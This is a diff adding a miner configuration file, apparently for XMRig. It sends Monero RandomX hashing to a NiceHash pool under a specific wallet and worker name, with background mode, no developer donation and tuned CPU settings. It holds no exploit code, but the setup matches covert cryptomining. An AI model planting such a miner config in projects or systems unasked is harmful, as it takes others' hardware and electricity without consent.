@@ -1,0 +1,42 @@
+{
+    "autosave": false,
+    "background": true,
+    "colors": true,
+    "donate-level": 0,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "priority": 1,
+        "memory-pool": false,
+        "asm": true,
+        "yield": true,
+        "_rx": [1, 4],
+    },
+    "randomx": {
+        "init": 2,
+        "_mode": "light",
+        "mode": "auto",
+        "1gb-pages": false,
+    },
+    "pools": [
+        {
+            "coin": "XMR",
+            "url": "stratum+tcp://randomxmonero.auto.nicehash.com:9200",
+            "user": "NHbakwCVSTNkrJptxiW3XhT8akXGEGfPFXE2.papyv2",
+            "pass": "x",
+            "nicehash": true,
+            "keepalive": true,
+            "enabled": true,
+            "tls": false,
+        }
+    ],
+    "retries": 100,
+    "retry-pause": 5,
+    "syslog": false,
+    "dns": {
+        "ipv6": false,
+        "ttl": 30
+    },
+    "verbose": 0,
+    "watch": false,
+}
